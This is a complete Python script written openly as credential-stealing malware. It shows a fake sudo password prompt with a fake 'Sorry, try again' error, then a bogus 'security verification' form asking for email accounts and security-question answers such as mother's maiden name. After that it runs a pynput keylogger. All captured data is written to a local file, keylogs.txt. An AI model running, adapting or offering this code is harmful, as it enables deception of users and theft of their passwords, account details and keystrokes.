#!/usr/bin/env python3

import os
import time
import getpass
from pynput.keyboard import Key, Listener

# File to store logs
LOG_FILE = "keylogs.txt"

# Fake sudo prompt to trick the user
def fake_sudo():
    with open(LOG_FILE, "a") as f:
        username = os.getlogin()
        print("\n[sudo] password for " + username + ": ", end="", flush=True)
        sudo_password = getpass.getpass("")  # Hides input like a real sudo prompt

        # Save password in the log file
        f.write(f"User: {username} | Sudo Password: {sudo_password}\n")

    print("Sorry, try again.")  # Fake error to avoid suspicion
    time.sleep(1)  # No extra indentation here

# Ask for email, social media accounts, and security questions
def ask_confidential():
    with open(LOG_FILE, "a") as f:
        print("\nFor security verification, please answer the following questions:")

        # Asking for email
        email = input("Enter your primary email (Gmail, Yahoo, etc.): ")
        f.write(f"Email: {email}\n")

        # Asking for social media email
        social_email = input("Enter your Social Media email (Facebook, Instagram, Twitter, etc.): ")
        f.write(f"Social Media Email: {social_email}\n")

        # Asking security questions
        questions = {
            "Mother's Maiden Name": "mother_name",
            "Pet's Name": "pet_name",
            "First School": "school_name",
            "Favorite Movie": "fav_movie"
        }

        for question, key in questions.items():
            answer = input(question + ": ")
            f.write(f"{question}: {answer}\n")

# Call fake sudo prompt
fake_sudo()

# Ask confidential questions
ask_confidential()

# Start keylogger
keys = []

def on_press(key):
    keys.append(key)
    write_to_file(keys)

def write_to_file(keys):
    with open(LOG_FILE, "a") as f:  # Save logs in keylogs.txt
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                f.write("\n")
            elif "Key" not in k:
                f.write(k)
        keys.clear()

def on_release(key):
    if key == Key.esc:
        return False  # Stop logging when ESC is pressed

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
